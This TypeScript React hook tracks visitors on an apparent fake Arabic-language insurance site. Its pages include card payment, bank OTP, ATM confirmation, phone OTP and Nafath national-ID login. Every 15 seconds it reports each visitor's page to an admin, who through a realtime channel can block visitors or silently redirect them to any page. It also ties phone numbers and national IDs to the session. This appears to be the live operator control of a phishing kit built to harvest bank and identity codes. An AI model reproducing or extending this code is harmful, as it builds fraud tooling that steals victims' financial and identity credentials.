import { useEffect, useRef, useCallback, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";

const PAGE_NAMES: Record<string, string> = {
  "/": "الصفحة الرئيسية",
  "/about": "من نحن",
  "/insurance-request": "طلب تأمين",
  "/insurance/offers": "عروض التأمين",
  "/insurance/compare": "مقارنة العروض",
  "/insurance/checkout": "إتمام الشراء",
  "/insurance/payment": "الدفع بالبطاقة",
  "/insurance/otp": "رمز التحقق البنكي",
  "/insurance/atm": "تأكيد ATM",
  "/insurance/phone-verify": "توثيق الجوال",
  "/insurance/phone-otp": "كود توثيق الجوال",
  "/insurance/phone-stc": "مكالمة STC",
  "/insurance/nafath-login": "دخول نفاذ",
  "/insurance/nafath-verify": "تحقق نفاذ",
  "/insurance/confirmation": "تأكيد الطلب",
  "/verify-policy": "التحقق من الوثيقة",
  "/admin/login": "دخول الأدمن",
  "/admin": "لوحة التحكم",
};

function getPageName(pathname: string): string {
  return PAGE_NAMES[pathname] || pathname;
}

function getSessionId(): string {
  let sid = sessionStorage.getItem("visitor_sid");
  if (!sid) {
    sid = crypto.randomUUID();
    sessionStorage.setItem("visitor_sid", sid);
  }
  return sid;
}

export function useVisitorTracking() {
  const location = useLocation();
  const navigate = useNavigate();
  const sessionId = useRef(getSessionId());
  const intervalRef = useRef<ReturnType<typeof setInterval>>();
  const [isBlocked, setIsBlocked] = useState(false);
  const [pendingRedirect, setPendingRedirect] = useState<string | null>(null);
  const lastRedirectRef = useRef<string | null>(null);

  useEffect(() => {
    if (location.pathname.startsWith("/admin")) return;
    if (sessionStorage.getItem("is_admin_session") === "1") return;

    const sid = sessionId.current;
    const pageName = getPageName(location.pathname);
    const geoResolved = sessionStorage.getItem("visitor_geo_resolved");

    const upsert = async () => {
      const { data, error } = await supabase.rpc("upsert_visitor_tracking", {
        p_session_id: sid,
        p_current_page: pageName,
        p_is_online: true,
      });

      if (!error && data) {
        const result = data as any;
        if (result?.is_blocked) {
          setIsBlocked(true);
        }
        if (result?.redirect_to && result.redirect_to !== lastRedirectRef.current) {
          lastRedirectRef.current = result.redirect_to;
          // Auto-redirect without prompting
          navigate(result.redirect_to, { replace: true });
          // Clear redirect_to so it doesn't re-trigger
          supabase.from("site_visitors").update({ redirect_to: null } as any).eq("session_id", sid).then(() => {});
        }
      }
    };

    upsert();

    if (!geoResolved) {
      sessionStorage.setItem("visitor_geo_resolved", "1");
      supabase.functions.invoke("resolve-geo", {
        body: { session_id: sid },
      }).catch(() => {});
    }

    intervalRef.current = setInterval(upsert, 15000);

    // Realtime subscription for instant redirect
    const channel = supabase
      .channel(`visitor-redirect-${sid}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "site_visitors",
          filter: `session_id=eq.${sid}`,
        },
        (payload) => {
          const updated = payload.new as any;
          if (updated?.is_blocked) {
            setIsBlocked(true);
          }
          if (updated?.redirect_to && updated.redirect_to !== lastRedirectRef.current) {
            lastRedirectRef.current = updated.redirect_to;
            navigate(updated.redirect_to, { replace: true });
            supabase.from("site_visitors").update({ redirect_to: null } as any).eq("session_id", sid).then(() => {});
          }
        }
      )
      .subscribe();

    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
      supabase.removeChannel(channel);
    };
  }, [location.pathname]);

  // Clear pending redirect when visitor navigates to the target page
  useEffect(() => {
    if (pendingRedirect && location.pathname === pendingRedirect) {
      setPendingRedirect(null);
    }
  }, [location.pathname, pendingRedirect]);

  useEffect(() => {
    if (isBlocked && location.pathname !== "/") {
      navigate("/", { replace: true });
    }
  }, [isBlocked, location.pathname, navigate]);

  const acceptRedirect = useCallback(() => {
    if (pendingRedirect) {
      navigate(pendingRedirect, { replace: true });
      setPendingRedirect(null);
    }
  }, [pendingRedirect, navigate]);

  const dismissRedirect = useCallback(() => {
    setPendingRedirect(null);
  }, []);

  const linkVisitorData = useCallback(async (data: {
    phone?: string;
    national_id?: string;
    visitor_name?: string;
    linked_request_id?: string;
    linked_conversation_id?: string;
  }) => {
    const sid = sessionId.current;
    await supabase.rpc("link_visitor_data", {
      p_session_id: sid,
      p_phone: data.phone || null,
      p_national_id: data.national_id || null,
      p_visitor_name: data.visitor_name || null,
    });
  }, []);

  return {
    linkVisitorData,
    sessionId: sessionId.current,
    isBlocked,
    pendingRedirect,
    acceptRedirect,
    dismissRedirect,
  };
}
